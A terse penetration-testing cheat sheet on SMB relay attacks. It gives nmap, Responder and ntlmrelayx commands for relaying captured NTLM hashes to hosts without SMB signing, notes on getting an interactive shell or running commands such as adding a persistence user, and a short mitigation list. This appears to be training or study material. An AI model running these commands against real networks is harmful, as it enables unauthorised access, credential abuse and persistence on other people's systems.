instead of cracking hashes, relay those hashes to another machine to potentially gain access

SMB signing must be disable or not enforced on target
relayed user creds must be admin on machine for any real value

1) ID Hosts without SMB signing:
		`$nmap --script=smb2-security-mode.nse -p445 <IP> -Pn
	1) Change responder.conf (/usr/share/responder)
		Disable 
			HTTP = Off
			SMB = Off
		`$python responder.py -I eth0 -rdwv`
		`$ntlmrelayx.py -tf targets.txt <--list of Host IPs> -smb2support`
		! Can also add -i flag for an interactive shell. Use `nc <IP, 127.0.0.1> <port>`
		! Can also use -c "command" to run a command on the remote host (add a user for persistence)


Mitigations and Remediations:
-Enable  singing on all devices
-Disable NTLM authentication on network
-Account tiering
-Local admin restriction